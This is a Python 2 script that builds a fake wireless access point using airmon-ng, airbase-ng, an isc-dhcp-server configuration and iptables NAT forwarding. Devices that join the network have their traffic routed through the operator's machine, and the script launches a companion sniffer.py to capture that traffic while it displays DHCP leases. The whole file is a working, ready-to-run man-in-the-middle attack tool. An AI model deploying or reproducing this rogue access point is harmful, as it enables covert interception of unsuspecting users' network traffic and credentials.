#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

import scapy.all as scapy
import subprocess
import threading
import socket
import signal
import struct
import fcntl
import time
import sys
import os

DN = open(os.devnull, 'w')

def get_isc_dhcp_server():
	if not os.path.isfile('/usr/sbin/dhcpd'):
		install = raw_input('[*]  isc-dhcp-server not found in /usr/sbin/dhcpd, install now? [y/n] ')
		if install == 'y':
			os.system('apt-get -y install isc-dhcp-server')
		else:
			sys.exit('[*] isc-dhcp-server not found in /usr/sbin/dhcpd')

def iwconfig():
	monitors = []
	interfaces = {}
	proc = subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	for line in proc.communicate()[0].split('\n'):
		if len(line) == 0: continue # Isn't an empty string
		if line[0] != ' ': # Doesn't start with space
			#ignore_iface = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]|at[0-9]', line)
			#if not ignore_iface: # Isn't wired or at0 tunnel
			iface = line[:line.find(' ')] # is the interface name
			if 'Mode:Monitor' in line:
				monitors.append(iface)
			elif 'IEEE 802.11' in line:
				if "ESSID:\"" in line:
					interfaces[iface] = 1
				else:
					interfaces[iface] = 0
	return monitors, interfaces

def rm_mon():
	monitors, interfaces = iwconfig()
	for m in monitors:
		if 'mon' in m:
			subprocess.Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
		else:
			subprocess.Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
			subprocess.Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)
			subprocess.Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)

def internet_info(interfaces):
	'''return the internet connected iface'''
	inet_iface = None
	proc = subprocess.Popen(['/sbin/ip', 'route'], stdout=subprocess.PIPE, stderr=DN)
	def_route = proc.communicate()[0].split('\n')#[0].split()
	for line in def_route:
		if 'default via' in line:
			line = line.split()
			inet_iface = line[4]
			ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
	if inet_iface:
		return inet_iface, ipprefix
	else:
		sys.exit('[*] No active internet connection found. Exiting')

def AP_iface(interfaces, inet_iface):
	useable_iface = []
	for i in interfaces:
		if i != inet_iface:
			useable_iface.append(i)
	return useable_iface

def iptables(inet_iface):
	os.system('iptables -X')
	os.system('iptables -F')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	os.system('iptables -t nat -A POSTROUTING -o %s -j MASQUERADE' % inet_iface)
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def start_monitor(ap_iface, channel):
	proc = subprocess.Popen(['airmon-ng', 'start', ap_iface, channel], stdout=subprocess.PIPE, stderr=DN)
	# todo: cleanup
	proc_lines = proc.communicate()[0].split('\n')

	# Old airmon-ng
	for line in proc_lines:
		if "monitor mode vif enabled" in line:
			line = line.split()
			mon_iface = line[6].split(']')[1]
			return mon_iface

	sys.exit('[-] Monitor mode not found. Paste output of `airmon-ng start [interface]` to github issues\n'
			 'https://github.com/DanMcInerney/fakeAP/issues')

def get_mon_mac(mon_iface):
	'''http://stackoverflow.com/questions/159137/getting-mac-address'''
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
	mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
	return mac

def start_ap(mon_iface, channel, essid,key):
	print '[*] Starting the fake access point...'
	subprocess.Popen(['airbase-ng', '-P', '-c', channel, '-e', essid,'-w',key, mon_iface], stdout=DN, stderr=DN)
	print '[*] Waiting for 6 seconds...'
	time.sleep(6)
	subprocess.Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
	subprocess.Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)

def cleanup(signal, frame):
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	os.system('iptables -F')
	os.system('iptables -X')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	os.system('pkill airbase-ng')
	os.system('pkill dhcpd')
	rm_mon()
	sys.exit('\n[+] Cleaned up')

def dhcp_conf(ipprefix):
	config = ('default-lease-time 300;\n'
			  'max-lease-time 360;\n'
			  'ddns-update-style none;\n'
			  'authoritative;\n'
			  'log-facility local7;\n'
			  'subnet %s netmask 255.255.255.0 {\n'
			  'range %s;\n'
			  'option routers %s;\n'
			  'option domain-name-servers %s;\n'
			  '}')
	if ipprefix == '19' or ipprefix == '17':
		with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
			# subnet, range, router, dns
			dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '114.114.114.114'))
	elif ipprefix == '10':
		with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
			dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '114.114.114.114'))
	return '/tmp/dhcpd.conf'

def dhcp(dhcpconf, ipprefix):
	os.system('echo > /var/lib/dhcp/dhcpd.leases')
	dhcp = subprocess.Popen(['dhcpd', '-cf', dhcpconf], stdout=subprocess.PIPE, stderr=DN)
	if ipprefix == '19' or ipprefix == '17':
		os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
	else:
		os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')


if __name__ == "__main__":

	# check if root user
	if os.geteuid() != 0:
		sys.exit('[Error!!!] You must run this script as root')

	# check dhcpd service
	get_isc_dhcp_server()

	# check if mon interface
	monitors, interfaces = iwconfig()

	# rm mon interface
	rm_mon()

	# get active internet interface
	inet_iface, ipprefix = internet_info(interfaces)

	# get useable ap_iface
	ap_iface = AP_iface(interfaces, inet_iface)

	# can not find any useable ap_iface
	if not ap_iface:
		sys.exit('[*] Found internet connected interface in '+inet_iface+'. Please bring up a wireless interface to use as the fake access point.')

	# set iptables firewall
	ipf = iptables(inet_iface)

	print '[*] Cleared leases, started DHCP, set up iptables'

	userSetAp = ap_iface[0]
	userSetChannel = '6'
	fadeESSID = '测试阿斯达收到'
	usersetkey = '1234567890'

	# get monitor iface
	mon_iface = start_monitor(userSetAp,userSetChannel)

	# get monitor mac
	mon_mac1 = get_mon_mac(mon_iface)

	# start
	start_ap(mon_iface, userSetChannel, fadeESSID,usersetkey)

	dhcpconf = dhcp_conf(ipprefix)
	dhcp(dhcpconf, ipprefix)

	print '[*] '+fadeESSID+' set up on channel '+userSetChannel+' via '+mon_iface+' on '+userSetAp
	subprocess.Popen(['xterm','-e','python',sys.path[0]+'/sniffer.py'], stdout=DN, stderr=DN)

	while 1:
		signal.signal(signal.SIGINT, cleanup)
		os.system('clear')
		proc = subprocess.Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=subprocess.PIPE, stderr=DN)
		for line in proc.communicate()[0].split('\n'):
			print line 

		time.sleep(1)